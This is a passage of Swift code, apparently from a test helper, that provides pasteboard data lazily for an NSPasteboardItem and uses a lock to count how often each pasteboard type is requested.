  func count(for type: NSPasteboard.PasteboardType) -> Int {
    lock.withLock { counts[type, default: 0] }
  }

  func pasteboard(_ pasteboard: NSPasteboard?, item: NSPasteboardItem,
                  provideDataForType type: NSPasteboard.PasteboardType) {
    lock.withLock { counts[type, default: 0] += 1 }
    if let value = values[type] {
      item.setData(value, forType: type)
    }
  }
}
